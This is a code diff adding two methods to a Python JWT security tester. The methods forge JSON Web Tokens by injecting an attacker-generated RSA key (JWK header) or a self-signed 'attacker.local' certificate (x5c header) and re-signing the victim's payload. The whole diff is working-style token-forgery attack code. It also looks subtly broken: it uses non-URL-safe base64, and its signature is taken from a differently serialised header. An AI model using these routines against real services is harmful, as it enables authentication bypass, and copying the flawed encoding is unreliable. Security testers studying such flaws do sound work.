@@ -597,6 +597,127 @@ class JWTSecurityTester:
             "message": f"Successfully executed {len(successful_attacks)} out of {len(results)} attacks"
         }
 
+    @staticmethod
+    def jwk_injection_attack(token):
+        """Test for JWK header injection vulnerability"""
+        try:
+            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
+            
+            # Generate a new key pair for the attack
+            private_key = rsa.generate_private_key(
+                public_exponent=65537,
+                key_size=2048,
+                backend=default_backend()
+            )
+            public_key = private_key.public_key()
+            
+            # Get key components for the JWK
+            public_numbers = public_key.public_numbers()
+            
+            # Create JWK representation
+            jwk = {
+                "kty": "RSA",
+                "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('='),
+                "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('='),
+            }
+            
+            # Modify header to include our JWK
+            modified_header = dict(header)
+            modified_header['jwk'] = jwk
+            
+            # Create new token with the injected JWK
+            encoded_header = base64.b64encode(json.dumps(modified_header).encode()).decode().rstrip('=')
+            encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
+            
+            # Sign with our private key
+            private_key_pem = private_key.private_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PrivateFormat.PKCS8,
+                encryption_algorithm=serialization.NoEncryption()
+            )
+            signature = jwt.encode(payload, private_key_pem, algorithm='RS256', headers=modified_header).split('.')[2]
+            
+            forged_token = f"{encoded_header}.{encoded_payload}.{signature}"
+            
+            return {
+                "success": True,
+                "forged_token": forged_token,
+                "message": "JWK injection attack successful",
+                "injected_jwk": jwk
+            }
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e)
+            }
+
+    @staticmethod
+    def x5c_injection_attack(token):
+        """Test for X.509 certificate chain injection vulnerability"""
+        try:
+            header, payload, _ = JWTSecurityTester.decode_token_parts(token)
+            
+            # Generate a new key pair and self-signed certificate
+            private_key = rsa.generate_private_key(
+                public_exponent=65537,
+                key_size=2048,
+                backend=default_backend()
+            )
+            
+            # Create self-signed certificate
+            subject = issuer = x509.Name([
+                x509.NameAttribute(x509.oid.NameOID.COMMON_NAME, u"attacker.local")
+            ])
+            
+            cert = x509.CertificateBuilder().subject_name(
+                subject
+            ).issuer_name(
+                issuer
+            ).public_key(
+                private_key.public_key()
+            ).serial_number(
+                x509.random_serial_number()
+            ).not_valid_before(
+                datetime.datetime.utcnow()
+            ).not_valid_after(
+                datetime.datetime.utcnow() + datetime.timedelta(days=365)
+            ).sign(private_key, hashes.SHA256(), default_backend())
+            
+            # Get certificate in PEM format and base64 encode
+            cert_pem = cert.public_bytes(serialization.Encoding.PEM)
+            cert_der = cert.public_bytes(serialization.Encoding.DER)
+            cert_b64 = base64.b64encode(cert_der).decode('utf-8')
+            
+            # Modify header to include our certificate
+            modified_header = dict(header)
+            modified_header['x5c'] = [cert_b64]
+            
+            # Create new token with the injected certificate
+            encoded_header = base64.b64encode(json.dumps(modified_header).encode()).decode().rstrip('=')
+            encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
+            
+            # Sign with our private key
+            private_key_pem = private_key.private_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PrivateFormat.PKCS8,
+                encryption_algorithm=serialization.NoEncryption()
+            )
+            signature = jwt.encode(payload, private_key_pem, algorithm='RS256', headers=modified_header).split('.')[2]
+            
+            forged_token = f"{encoded_header}.{encoded_payload}.{signature}"
+            
+            return {
+                "success": True,
+                "forged_token": forged_token,
+                "message": "X.509 certificate injection attack successful",
+                "injected_certificate": cert_pem.decode('utf-8')
+            }
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e)
+            }
+
 class JWTTester:
     """
     Provides comprehensive JWT testing functionality.
